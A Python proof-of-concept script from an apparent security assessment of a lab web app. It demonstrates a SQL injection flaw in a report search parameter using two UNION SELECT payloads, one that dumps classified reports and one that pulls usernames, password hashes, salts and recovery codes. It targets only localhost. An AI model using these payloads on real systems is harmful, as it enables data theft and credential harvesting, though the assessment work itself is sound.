"""
PoC: F-002 — SQL Injection via Search Parameter
World Monitor Security Assessment — SIH26163 (NTRO)

SAFE PoC — Only targets localhost lab. No production systems.
Prerequisites: Lab server running at http://127.0.0.1:8001
"""
import httpx

TARGET = "http://127.0.0.1:8001"
ANALYST_TOKEN = "wm_sec_token_ana_4210"

print("=" * 60)
print("F-002: SQL Injection in /api/reports?search=")
print("=" * 60)

headers = {"Authorization": f"Bearer {ANALYST_TOKEN}"}

# PoC 1: UNION SELECT to dump all classified reports
sqli_payload = "' UNION SELECT id,title,classification,summary,content,notes,author_id FROM reports WHERE '1'='1"
print(f"\n[PoC 1] UNION SELECT — dump all reports")
print(f"Payload: {sqli_payload[:80]}...")
resp = httpx.get(f"{TARGET}/api/reports", params={"search": sqli_payload}, headers=headers, timeout=10)
print(f"HTTP Status: {resp.status_code}")

if resp.status_code == 200:
    rows = resp.json()
    print(f"[CONFIRMED] SQL Injection returned {len(rows)} rows")
    for row in rows:
        if row.get("classification") == "RESTRICTED_TOP_SECRET":
            print(f"  [!] TOP SECRET RECORD LEAKED: id={row['id']}, title={row['title'][:50]}")
        else:
            print(f"       Normal record: id={row['id']}, class={row['classification']}")
else:
    print(f"[FIXED or ERROR] Status: {resp.status_code}")

# PoC 2: UNION SELECT to harvest user credentials (redacted output)
sqli_cred = "' UNION SELECT 1,username,role,password_hash,salt,recovery_codes,1 FROM users WHERE '1'='1"
print(f"\n[PoC 2] UNION SELECT — user credential harvest")
resp2 = httpx.get(f"{TARGET}/api/reports", params={"search": sqli_cred}, headers=headers, timeout=10)
print(f"HTTP Status: {resp2.status_code}")

if resp2.status_code == 200:
    cred_rows = resp2.json()
    print(f"[CONFIRMED] Credential harvest returned {len(cred_rows)} rows")
    for row in cred_rows:
        print(f"  → User: {row.get('title','?')} | Role: {row.get('classification','?')} | Hash: <REDACTED>")
else:
    print("[FIXED] Parameterized queries in effect.")

print("\nSafe PoC complete. No production systems contacted.")
